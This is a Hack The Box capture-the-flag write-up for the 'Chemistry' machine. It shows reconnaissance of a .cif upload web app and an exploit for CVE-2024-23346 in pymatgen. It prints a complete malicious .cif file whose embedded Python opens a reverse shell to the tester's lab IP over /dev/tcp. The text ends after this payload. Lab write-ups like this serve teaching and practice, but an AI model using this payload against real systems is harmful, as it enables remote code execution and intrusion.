# Chemistry - HTB Writeup
Chemistry is an easy difficulty machine. The solving took many steps however the journey was natural so it didn't pose much trouble.  
Tasks Included:  
-identifying vulnerable services  
-exploiting vulnerable services  
-lateral movement  
-ssh port tunneling  
## Initial exploitation  
As always i started with nmap scan.  
The application used ssh which is ordinary and port 5000 was open.  
The script and port scan revealed that the service can be accessed via http.   
The important is the python version `Python 3.9.5` that  will be utilized later.  
To acces it all you  need to do is visit the ip on browser with thee port specified : `http://10.129.231.170:5000`  
On the page we are presented with login and register form.  
Since we don't have any login credential we can register with new account and access the application. 
Now the page is used for storing and viewing `.cif` files and examplpe is also provided.  
The .cif is used to store crystallography data that describe crystalic structure.   
So this application serves some chemistry workers to analyze their data.  
However the python version used that we enumerated earlier is vulnerable.  
Uploading malicious .cif file can trigger RCE because of broken eval() function.  
[CVE-2024-23346](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346)
Here is the crafted payload that i used.
```vuln.cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.15.96/4444 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
